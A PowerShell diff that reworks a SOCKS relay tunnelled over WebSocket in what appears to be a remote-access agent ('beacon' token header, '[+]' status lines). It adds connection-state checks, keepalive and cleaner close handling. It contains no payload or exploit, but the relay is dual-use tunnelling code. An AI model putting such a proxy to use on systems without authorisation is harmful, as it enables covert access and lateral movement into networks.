@@ -933,76 +933,88 @@ function Send-RmmSocksResponsesWs {
     }
 }
 
+function Test-RmmSocksWsOpen {
+    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
+    return $WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open
+}
+
+function Close-RmmSocksWebSocket {
+    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
+    if ($null -eq $WebSocket) { return }
+    try {
+        if ($WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+            $null = $WebSocket.CloseAsync(
+                [System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,
+                '',
+                [System.Threading.CancellationToken]::None
+            ).GetAwaiter().GetResult()
+        }
+    } catch { }
+    try { $WebSocket.Dispose() } catch { }
+}
+
 function Send-RmmSocksWsJson {
     param(
         [System.Net.WebSockets.ClientWebSocket]$WebSocket,
         $Message
     )
+    if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
+        throw [System.InvalidOperationException]::new(
+            "SOCKS WebSocket not open (state=$($WebSocket.State))"
+        )
+    }
     $json = $Message | ConvertTo-Json -Compress -Depth 10
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     $seg = [System.ArraySegment[byte]]::new($bytes)
-    $null = $WebSocket.SendAsync(
-        $seg,
-        [System.Net.WebSockets.WebSocketMessageType]::Text,
-        $true,
-        [System.Threading.CancellationToken]::None
-    ).GetAwaiter().GetResult()
+    try {
+        $null = $WebSocket.SendAsync(
+            $seg,
+            [System.Net.WebSockets.WebSocketMessageType]::Text,
+            $true,
+            [System.Threading.CancellationToken]::None
+        ).GetAwaiter().GetResult()
+    } catch [System.Net.WebSockets.WebSocketException] {
+        throw [System.InvalidOperationException]::new(
+            "SOCKS WebSocket send failed (state=$($WebSocket.State)): $($_.Exception.Message)"
+        )
+    }
 }
 
 function Receive-RmmSocksWsJson {
-    param(
-        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
-        [int]$TimeoutMs = 80
-    )
+    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
+    # Never cancel ReceiveAsync — on .NET, cancellation leaves the socket Aborted.
+    if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
+        return @{ op = 'close' }
+    }
     $buf = New-Object byte[] 262144
     $seg = [System.ArraySegment[byte]]::new($buf)
     $sb = New-Object System.Text.StringBuilder
-    $deadline = [DateTime]::UtcNow.AddMilliseconds($TimeoutMs)
-    while ([DateTime]::UtcNow -lt $deadline) {
-        $remainMs = [int][Math]::Max(1, ($deadline - [DateTime]::UtcNow).TotalMilliseconds)
-        $cts = New-Object System.Threading.CancellationTokenSource
-        $cts.CancelAfter($remainMs)
-        try {
-            $recv = $WebSocket.ReceiveAsync($seg, $cts.Token).GetAwaiter().GetResult()
-        } catch {
-            if ($sb.Length -gt 0) { break }
-            return $null
-        } finally {
-            $cts.Dispose()
-        }
-        if ($recv.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
-            return @{ op = 'close' }
-        }
-        [void]$sb.Append([System.Text.Encoding]::UTF8.GetString($buf, 0, $recv.Count))
-        if ($recv.EndOfMessage) {
-            try {
-                return ($sb.ToString() | ConvertFrom-Json)
-            } catch {
-                return $null
+    try {
+        while ($true) {
+            $recv = $WebSocket.ReceiveAsync(
+                $seg,
+                [System.Threading.CancellationToken]::None
+            ).GetAwaiter().GetResult()
+            if ($recv.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
+                return @{ op = 'close' }
+            }
+            [void]$sb.Append([System.Text.Encoding]::UTF8.GetString($buf, 0, $recv.Count))
+            if ($recv.EndOfMessage) {
+                try {
+                    return ($sb.ToString() | ConvertFrom-Json)
+                } catch {
+                    return $null
+                }
             }
         }
+    } catch [System.Net.WebSockets.WebSocketException] {
+        return @{ op = 'close' }
+    } catch {
+        if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
+            return @{ op = 'close' }
+        }
+        throw
     }
-    if ($sb.Length -gt 0) {
-        try {
-            return ($sb.ToString() | ConvertFrom-Json)
-        } catch { }
-    }
-    return $null
-}
-
-function Receive-RmmSocksWsMessages {
-    param(
-        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
-        [int]$TimeoutMs = 80
-    )
-    $msgs = New-Object System.Collections.ArrayList
-    while ($true) {
-        $m = Receive-RmmSocksWsJson -WebSocket $WebSocket -TimeoutMs $TimeoutMs
-        if ($null -eq $m) { break }
-        [void]$msgs.Add($m)
-        if ($m.op -eq 'close') { break }
-    }
-    return @($msgs)
 }
 
 function Invoke-RmmSocksDrainTcpToWs {
@@ -1042,6 +1054,9 @@ function Invoke-RmmSocksHandleWsMessages {
 function Connect-RmmSocksClientWebSocket {
     $info = Get-RmmSocksWsConnectInfo
     $ws = [System.Net.WebSockets.ClientWebSocket]::new()
+    try {
+        $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(20)
+    } catch { }
     if ($beaconSecret) {
         $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
     }
@@ -1095,42 +1110,27 @@ function Invoke-RmmSocksWsRelay {
     Write-RmmSocksHostLine '[+] SOCKS WebSocket channel active (pull/push)'
     $headers = Get-RmmRequestHeaders
     $emptyPoll = @{ active = $true; tasks = @() }
-    $lastPing = [DateTime]::UtcNow
     try {
-        $boot = Receive-RmmSocksWsMessages -WebSocket $ws -TimeoutMs 5000
-        if ((Invoke-RmmSocksHandleWsMessages -WebSocket $ws -Headers $headers -Messages $boot) -eq 'stop') {
+        $boot = Receive-RmmSocksWsJson -WebSocket $ws
+        if ((Invoke-RmmSocksHandleWsMessages -WebSocket $ws -Headers $headers -Messages @($boot)) -eq 'stop') {
             Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
             return
         }
         while (-not $RmmSocksChannelStop) {
-            # Drain remote TCP before blocking on WS (avoids stalls during pull recv).
             Invoke-RmmSocksDrainTcpToWs -WebSocket $ws -Headers $headers -EmptyPoll $emptyPoll
-            if (([DateTime]::UtcNow - $lastPing).TotalSeconds -ge 25) {
-                Send-RmmSocksWsJson -WebSocket $ws -Message @{ op = 'ping' }
-                $lastPing = [DateTime]::UtcNow
-            }
-            $pushed = Receive-RmmSocksWsMessages -WebSocket $ws -TimeoutMs 40
-            if ((Invoke-RmmSocksHandleWsMessages -WebSocket $ws -Headers $headers -Messages $pushed) -eq 'stop') {
-                Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
-                break
-            }
             Send-RmmSocksWsJson -WebSocket $ws -Message @{ op = 'pull' }
-            $replies = Receive-RmmSocksWsMessages -WebSocket $ws -TimeoutMs 250
-            if ((Invoke-RmmSocksHandleWsMessages -WebSocket $ws -Headers $headers -Messages $replies) -eq 'stop') {
+            $reply = Receive-RmmSocksWsJson -WebSocket $ws
+            if ($null -eq $reply -or $reply.op -eq 'close') {
+                throw [System.IO.IOException]::new('SOCKS WebSocket closed by server')
+            }
+            if ((Invoke-RmmSocksHandleWsMessages -WebSocket $ws -Headers $headers -Messages @($reply)) -eq 'stop') {
                 Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
                 break
             }
             Invoke-RmmSocksDrainTcpToWs -WebSocket $ws -Headers $headers -EmptyPoll $emptyPoll
         }
     } finally {
-        try {
-            $null = $ws.CloseAsync(
-                [System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,
-                '',
-                [System.Threading.CancellationToken]::None
-            ).GetAwaiter().GetResult()
-        } catch { }
-        $ws.Dispose()
+        Close-RmmSocksWebSocket -WebSocket $ws
     }
 }
 
@@ -1177,10 +1177,11 @@ function Get-RmmSocksWorkerFunctionNames {
         'Invoke-RmmSocksCycle',
         'Get-RmmSocksWsConnectInfo',
         'Connect-RmmSocksClientWebSocket',
+        'Test-RmmSocksWsOpen',
+        'Close-RmmSocksWebSocket',
         'Send-RmmSocksWsJson',
         'Sort-RmmSocksTasks',
         'Receive-RmmSocksWsJson',
-        'Receive-RmmSocksWsMessages',
         'Send-RmmSocksResponsesWs',
         'Invoke-RmmSocksDrainTcpToWs',
         'Invoke-RmmSocksHandleWsMessages',
